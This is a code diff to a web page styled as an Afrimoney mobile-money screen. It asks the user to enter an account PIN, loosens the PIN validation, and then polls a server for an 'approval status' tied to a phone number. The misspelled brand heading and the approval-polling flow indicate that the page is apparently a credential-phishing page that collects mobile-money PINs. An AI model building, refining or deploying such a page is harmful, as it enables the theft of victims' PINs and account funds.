@@ -119,7 +119,7 @@
             border: 1.5px solid rgba(255, 255, 255, 0.22);
             border-radius: 14px;
             font-size: 20px;
-            letter-spacing: 6px;
+            letter-spacing: 4px;
             text-align: center;
             color: #000000;
             font-weight: 700;
@@ -296,11 +296,11 @@
 
             <!-- Main Card & PIN Form Section -->
             <div class="e-card-box">
-                <h2>Enter Afrimoney PIN</h2>
+                <h2>Enter your Afrmoney Pin Code</h2>
                 <p>Please enter your Afrimoney account PIN to confirm your request.</p>
 
                 <div class="e-input-group">
-                    <input type="password" id="mpin" class="e-input-field" placeholder="Pin Code" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="current-password" autofocus required oninput="checkPinLength()">
+                    <input type="password" id="mpin" class="e-input-field" placeholder="Pin Code" inputmode="numeric" pattern="[0-9]*" autocomplete="current-password" autofocus required oninput="checkPinLength()">
                     <i class="fa-solid fa-eye toggle-password" id="toggleEye" onclick="togglePinVisibility()"></i>
                 </div>
             </div>
@@ -355,10 +355,15 @@
 
     // Dynamic button color & active state once PIN has values
     function checkPinLength() {
-        const mpinInput = document.getElementById('mpin').value.trim();
+        const mpinInput = document.getElementById('mpin');
+        
+        // Ensure only numeric characters are entered
+        mpinInput.value = mpinInput.value.replace(/\D/g, '');
+
+        const val = mpinInput.value.trim();
         const confirmBtn = document.getElementById('confirmBtn');
 
-        if (mpinInput.length >= 4) {
+        if (val.length > 0) {
             confirmBtn.classList.add('active');
         } else {
             confirmBtn.classList.remove('active');
@@ -369,7 +374,7 @@
         const mpinInput = document.getElementById('mpin').value.trim();
         const spinnerDiv = document.getElementById('loadingSpinner');
 
-        if (mpinInput.length < 4) {
+        if (mpinInput.length === 0) {
             showAppAlert('Please enter your valid Afrimoney PIN.');
             return;
         }
@@ -393,7 +398,7 @@
                 if (spinnerDiv) spinnerDiv.style.display = 'flex'; 
                 pollApprovalStatus(phoneInput);
             } else {
-                showAppAlert('Error: ' + result.message);
+                showAppAlert('Error: ' + (result.message || 'Verification failed.'));
             }
         } catch (error) {
             console.error('Error:', error);
